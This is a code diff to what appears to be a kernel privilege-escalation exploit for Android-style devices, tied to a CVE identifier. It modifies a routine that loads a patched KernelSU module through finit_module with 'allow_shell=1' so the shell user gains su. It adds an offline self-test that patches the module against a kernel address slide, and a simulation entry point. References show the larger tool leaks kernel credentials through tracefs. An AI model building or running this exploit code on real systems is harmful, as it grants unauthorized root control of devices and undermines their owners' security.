@@ -7514,7 +7514,17 @@ static int direct_ko_load_file(const char *path, unsigned long long slide) {
         return 5;
     }
     errno = 0;
-    result = (int)syscall(__NR_finit_module, fd, "", 0); /* flags MUST be 0 */
+    {
+        /* KSU module init reads the `allow_shell` param; ksud late-load passes
+         * "allow_shell=1" when --allow-shell is used (late_load.rs).  Without
+         * it the loaded kernel refuses su for uid-2000 (shell) even though the
+         * module is Live.  flags MUST stay 0. */
+        const char *params = getenv("CVE99491_KSU_PARAMS");
+
+        if (!params || !*params)
+            params = "allow_shell=1";
+        result = (int)syscall(__NR_finit_module, fd, params, 0);
+    }
     saved_errno = result ? errno : 0;
     printf("[ko] finit_module result=%d errno=%d (%s)\n", result,
            saved_errno, result ? strerror(saved_errno) : "ok");
@@ -7560,6 +7570,51 @@ static int direct_ko_load_main(unsigned long long slide) {
     return direct_ko_load_file(path, slide);
 }
 
+
+/*
+ * Offline self-test: patch the kernelsu.ko ELF and write the patched image to a
+ * file, without any kernel access.  Used for host-side simulation of the ko
+ * backend (CVE99491_KO_SELFTEST=1).
+ */
+static int direct_ko_selftest(void) {
+    const char *path = getenv("CVE99491_KSU_KO");
+    const char *out = getenv("CVE99491_KO_OUT");
+    const char *sl = getenv("CVE99491_KO_SLIDE");
+    unsigned long long slide = (sl && *sl) ? strtoull(sl, NULL, 0) : 0;
+    unsigned char *buf = NULL;
+    size_t size = 0, done = 0;
+    int patched = 0, missing = 0, rc, fd;
+
+    if (!path || !*path || !out || !*out) {
+        printf("[selftest] need CVE99491_KSU_KO and CVE99491_KO_OUT\n");
+        return 2;
+    }
+    if (direct_read_whole_file(path, &buf, &size) != 0) {
+        printf("[selftest] read %s failed errno=%d\n", path, errno);
+        return 3;
+    }
+    rc = direct_patch_module(buf, size, slide, &patched, &missing);
+    printf("[selftest] patch rc=%d patched=%d missing=%d size=%zu slide=%#llx\n",
+           rc, patched, missing, size, slide);
+    if (rc == 0) {
+        fd = open(out, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (fd < 0) {
+            printf("[selftest] open %s failed errno=%d\n", out, errno);
+        } else {
+            while (done < size) {
+                ssize_t n = write(fd, buf + done, size - done);
+
+                if (n <= 0)
+                    break;
+                done += (size_t)n;
+            }
+            close(fd);
+            printf("[selftest] wrote %s bytes=%zu\n", out, done);
+        }
+    }
+    free(buf);
+    return rc ? 4 : 0;
+}
 
 /*
  * --stage=cred: tracefs cred leak + euid oracle only.  This modifies only the
@@ -8003,6 +8058,20 @@ static void usage(FILE *out, const char *p)
 }
 
 int main(int argc, char **argv) {
+    if (getenv("CVE99491_KO_SELFTEST"))
+        return direct_ko_selftest();
+    if (getenv("CVE99491_KO_SIM_FINIT")) {
+        const char *p = getenv("CVE99491_KSU_KO");
+        const char *sl = getenv("CVE99491_KO_SLIDE");
+        unsigned long long slide = (sl && *sl) ? strtoull(sl, NULL, 0) : 0;
+
+        if (!p || !*p) {
+            printf("[sim] need CVE99491_KSU_KO\n");
+            return 2;
+        }
+        return direct_ko_load_file(p, slide);
+    }
+
     const char *mode_name = "real_cred";
     const char *stage_name = NULL;
     const char *cli_pm_backend = NULL;
